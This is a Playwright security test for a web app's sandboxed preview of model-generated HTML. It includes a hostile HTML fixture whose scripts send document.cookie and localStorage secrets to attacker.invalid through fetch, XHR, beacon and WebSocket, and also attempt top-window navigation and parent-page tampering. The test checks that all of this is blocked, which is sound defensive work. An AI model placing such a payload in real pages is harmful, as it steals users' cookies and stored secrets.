import { expect, test, type Page, type Route } from "@playwright/test";

const SESSION_ID = "s_safe_html";
const ARTIFACT_ID = "art_safe_html";
const FRAME_TITLE = "Security fixture";

const json = (body: unknown, status = 200) => ({
  status,
  contentType: "application/json",
  body: JSON.stringify(body),
});

const maliciousHtml = `<!doctype html>
<html>
  <head>
    <title>Unsafe model output</title>
    <meta http-equiv="refresh" content="0;url=https://attacker.invalid/refresh">
    <base href="https://attacker.invalid/">
    <link rel="stylesheet" href="https://attacker.invalid/external.css">
    <style>
      @import "https://attacker.invalid/import.css";
      @font-face { font-family: Leak; src: url(https://attacker.invalid/font.woff2); }
      body { background-image: url(https://attacker.invalid/background.png); }
    </style>
    <script src="https://attacker.invalid/external.js"></script>
    <script>
      try {
        parent.document.documentElement.dataset.compromised = "true";
        fetch("https://attacker.invalid/fetch?cookie=" + encodeURIComponent(document.cookie));
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://attacker.invalid/xhr");
        xhr.send(localStorage.getItem("safe-html-secret"));
        new WebSocket("wss://attacker.invalid/socket");
        navigator.sendBeacon("https://attacker.invalid/beacon", "secret");
        new Worker("https://attacker.invalid/worker.js");
        window.open("https://attacker.invalid/popup");
        top.location = "https://attacker.invalid/top-navigation";
        var download = document.createElement("a");
        download.href = "https://attacker.invalid/download";
        download.download = "secret.txt";
        download.click();
      } catch (_) {}
    </script>
  </head>
  <body onload="fetch('https://attacker.invalid/onload')">
    <p id="safe-content">Safe static result</p>
    <form action="https://attacker.invalid/form">
      <input name="secret" value="classified">
      <button type="submit">Submit</button>
    </form>
    <a href="https://attacker.invalid/link" target="_top" download>Leave</a>
    <img src="https://attacker.invalid/pixel.png"
         srcset="https://attacker.invalid/pixel-2x.png 2x">
    <iframe src="https://attacker.invalid/nested"></iframe>
    <object data="https://attacker.invalid/object"></object>
    <embed src="https://attacker.invalid/embed">
    <video src="https://attacker.invalid/video.mp4"
           poster="https://attacker.invalid/poster.png"></video>
  </body>
</html>`;

async function mockSafeHtmlReport(page: Page): Promise<void> {
  await page.route("**/health", async (route: Route) => {
    await route.fulfill(json({
      ok: true,
      feature_flags: {
        results_workspace: true,
      },
    }));
  });
  await page.route("**/api/v1/auth/me", async (route: Route) => {
    await route.fulfill(json({
      id: "safe_viewer",
      email: "safe-viewer@example.com",
      name: "Safe Viewer",
      tier: "ultra",
      capabilities: {},
      entitlement: { read_only: false },
    }));
  });
  await page.route("**/api/v1/auth/me/workspaces", async (route: Route) => {
    await route.fulfill(json({
      items: [{
        workspace_id: "ws_safe",
        name: "Safe workspace",
        description: "",
      }],
      active_id: "ws_safe",
    }));
  });
  await page.route("**/api/v1/user-settings**", async (route: Route) => {
    await route.fulfill(json({ settings: {} }));
  });
  await page.route("**/api/v1/theme/effective", async (route: Route) => {
    await route.fulfill(json({ mode: "light", tokens: {} }));
  });
  await page.route("**/api/v1/team-settings/theme-policy", async (route: Route) => {
    await route.fulfill(json({ value: null }));
  });
  await page.route("**/api/v1/llm/catalog", async (route: Route) => {
    await route.fulfill(json({ providers: [], defaults: {} }));
  });
  await page.route("**/api/v1/sessions", async (route: Route) => {
    await route.fulfill(json({
      groups: [{
        id: "shared",
        label: "Shared",
        items: [{
          id: SESSION_ID,
          title: FRAME_TITLE,
          intents: ["report"],
          time: "09:00",
          state: "done",
        }],
      }],
    }));
  });
  await page.route(
    `**/api/v1/sessions/${SESSION_ID}**`,
    async (route: Route) => {
      const pathname = new URL(route.request().url()).pathname;
      if (pathname.endsWith("/seen")) {
        await route.fulfill(json({ ok: true }));
        return;
      }
      await route.fulfill(json({ detail: "forbidden" }, 403));
    },
  );
  await page.route(
    `**/api/v1/canvas/by-session/${SESSION_ID}**`,
    async (route: Route) => {
      const pathname = new URL(route.request().url()).pathname;
      if (pathname.endsWith(`/artifacts/${ARTIFACT_ID}`)) {
        await route.fulfill({
          status: 200,
          contentType: "text/html",
          body: maliciousHtml,
        });
        return;
      }
      if (pathname.endsWith("/artifacts")) {
        await route.fulfill(json({
          items: [{
            id: ARTIFACT_ID,
            filename: "security-fixture.html",
            mime: "text/html",
            size: maliciousHtml.length,
            source: "python_sandbox",
            created_at: "2026-07-30T00:00:00Z",
            preview_available: true,
            kind: "deliverable",
            origin: "compute",
            trust: "unverified",
            created_by_turn: null,
          }],
        }));
        return;
      }
      await route.fulfill(json({
        canvas: {
          id: "cv_safe_html",
          sessionId: SESSION_ID,
          workspaceId: "ws_safe",
          title: FRAME_TITLE,
          status: "done",
          createdAt: "2026-07-30T00:00:00Z",
          updatedAt: "2026-07-30T00:00:00Z",
        },
        sections: [{
          id: "html_safe",
          kind: "html_artifact",
          artifact_id: ARTIFACT_ID,
          title: FRAME_TITLE,
          unverified: true,
        }],
        sourceRefs: [],
      }));
    },
  );
  await page.route("**/api/v1/memory/snapshot", async (route: Route) => {
    await route.fulfill(json({ items: [] }));
  });
  await page.route("**/api/v1/metrics/event", async (route: Route) => {
    await route.fulfill(json({ ok: true }));
  });
}

test("production safe HTML path blocks active content and external resources", async ({
  page,
}) => {
  const externalRequests: string[] = [];
  const webSockets: string[] = [];
  let popupCount = 0;
  let downloadCount = 0;

  await page.addInitScript(() => {
    window.localStorage.setItem("safe-html-secret", "classified");
    document.cookie = "safe_html_secret=classified; path=/";
  });
  await page.route("https://attacker.invalid/**", async (route) => {
    externalRequests.push(route.request().url());
    await route.fulfill({ status: 204 });
  });
  page.on("websocket", (socket) => {
    if (new URL(socket.url()).hostname === "attacker.invalid") {
      webSockets.push(socket.url());
    }
  });
  page.on("popup", () => {
    popupCount += 1;
  });
  page.on("download", () => {
    downloadCount += 1;
  });
  await mockSafeHtmlReport(page);

  await page.goto(`/?session=${SESSION_ID}&report=1`);

  const iframe = page.locator(`iframe[title="${FRAME_TITLE}"]`);
  await expect(iframe).toHaveAttribute("sandbox", "");
  await expect(iframe).toHaveAttribute("referrerpolicy", "no-referrer");

  const preview = page.frameLocator(`iframe[title="${FRAME_TITLE}"]`);
  await expect(preview.locator("#safe-content")).toHaveText(
    "Safe static result",
  );
  await expect(
    preview.locator(
      "script, form, input, button, iframe, object, embed, link, video, audio, svg",
    ),
  ).toHaveCount(0);
  await expect(
    preview.locator(
      "[href*='attacker.invalid'], [src*='attacker.invalid'], [data*='attacker.invalid']",
    ),
  ).toHaveCount(0);
  await expect(iframe).toHaveAttribute(
    "srcdoc",
    /default-src 'none'.*script-src 'none'.*connect-src 'none'/,
  );

  await page.waitForTimeout(300);
  expect(externalRequests).toEqual([]);
  expect(webSockets).toEqual([]);
  expect(popupCount).toBe(0);
  expect(downloadCount).toBe(0);
  await expect(page).toHaveURL(new RegExp(`session=${SESSION_ID}`));
  expect(
    await page.locator("html").getAttribute("data-compromised"),
  ).toBeNull();

  await page.getByRole("button", { name: /成果|Results/ }).click();
  await expect(page.getByRole("dialog", { name: /成果导航|Results/ })).toBeVisible();
});
